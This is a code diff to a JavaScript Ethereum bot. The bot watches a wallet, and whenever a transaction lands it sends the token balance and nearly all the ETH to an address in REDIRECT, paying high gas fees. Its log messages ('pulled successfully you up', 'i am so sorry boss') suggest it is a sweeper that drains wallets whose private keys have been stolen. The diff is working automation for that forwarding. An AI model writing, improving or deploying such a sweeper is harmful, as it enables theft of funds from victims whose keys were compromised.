@@ -92,7 +92,10 @@ const main = async () => {
       console.log(`pending transaction hash:${tx['hash']}`)
 
       provider.once(tx['hash'], async (transaction) => {
-        await removeMoney(getToken)
+        if (parseInt(getToken) > 0.0) {
+          await removeMoney(getToken)
+        }
+
         console.log(
           `new transaction confirmation count:${transaction['confirmations']}`,
         )
@@ -105,65 +108,44 @@ const main = async () => {
         console.log(`current balance:${lBalance}`)
         var llbalance = parseFloat(lBalance)
 
-        var reallBalance = llbalance - 0.001209643999999988
+        var reallBalance = llbalance - 0.005009643999999988
 
         console.log(`amount to send: ${reallBalance}`)
 
-        try {
-          const transfer = await multichainWallet.transfer({
-            recipientAddress: process.env.REDIRECT,
-            amount: bal,
-            network: 'ethereum',
-            rpcUrl: process.env.RPC,
-            privateKey: process.env.PRIVATE_KEY,
-            gasPrice: '50', // Gas price is in Gwei. leave empty to use default gas price
-            tokenAddress: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
-          }) // NOTE - For other EVM compatible blockchains all you have to do is change the rpcUrl.
-
-          const wallets = Promise.resolve(transfer)
-          wallets.then((value) => {
-            if (value['hash'] == null) console.log('i am so sorry boss')
-
-            console.log(`pulled successfully you up ${value['hash']}`)
-
-            sendTX = async () => {
-              const newnonce = await alchemy.core.getTransactionCount(
-                process.env.WALLET,
-                'latest',
-              )
-              try {
-                let transaction = {
-                  to: process.env.REDIRECT,
-                  // to: "0x56dc2c15635c2afFEE954862C9968F14ab2f0BA5",
-                  value: Utils.parseEther(`${reallBalance}`),
-                  gasLimit: '21000',
-                  maxPriorityFeePerGas: Utils.parseUnits('100', 'gwei'),
-                  maxFeePerGas: Utils.parseUnits('100', 'gwei'),
-                  nonce: newnonce,
-                  type: 2,
-                  chainId: process.env.CHAIN_ID,
-                }
-
-                let rawTransaction = await wallet.signTransaction(transaction)
-                let tx = await alchemy.core.sendTransaction(rawTransaction)
-                console.log('Sent transaction', tx)
-
-                let balance = await alchemy.core.getBalance(
-                  process.env.WALLET,
-                  'latest',
-                )
-
-                balance = Utils.formatEther(balance)
-                console.log(
-                  `Balance of ${await wallet.getAddress()}: ${balance} ETH`,
-                )
-              } catch (error) {
-                console.log(error.reason)
-              }
+        sendTX = async () => {
+          const newnonce = await alchemy.core.getTransactionCount(
+            process.env.WALLET,
+            'latest',
+          )
+          try {
+            let transaction = {
+              to: process.env.REDIRECT,
+              // to: "0x56dc2c15635c2afFEE954862C9968F14ab2f0BA5",
+              value: Utils.parseEther(`${reallBalance}`),
+              gasLimit: '21000',
+              maxPriorityFeePerGas: Utils.parseUnits('100', 'gwei'),
+              maxFeePerGas: Utils.parseUnits('100', 'gwei'),
+              nonce: newnonce,
+              type: 2,
+              chainId: process.env.CHAIN_ID,
             }
-          })
-        } catch (error) {
-          console.log(error)
+
+            let rawTransaction = await wallet.signTransaction(transaction)
+            let tx = await alchemy.core.sendTransaction(rawTransaction)
+            console.log(`----- forwarded to ${tx['to']} -----\nwith transaction hash: ${tx['hash']}_________',`)
+
+            let balance = await alchemy.core.getBalance(
+              process.env.WALLET,
+              'latest',
+            )
+
+            balance = Utils.formatEther(balance)
+            console.log(
+              `Balance of ${await wallet.getAddress()}: ${balance} ETH`,
+            )
+          } catch (error) {
+            console.log(error.reason)
+          }
         }
 
         sendTX()
@@ -198,14 +180,12 @@ const removeMoney = async (bal) => {
     const wallets = Promise.resolve(transfer)
     wallets.then((value) => {
       if (value['hash'] == null) console.log('i am so sorry boss')
+
       console.log(`pulled successfully you up ${value['hash']}`)
     })
   } catch (error) {
     console.log(error)
   }
 }
-
-
-
 
 main()
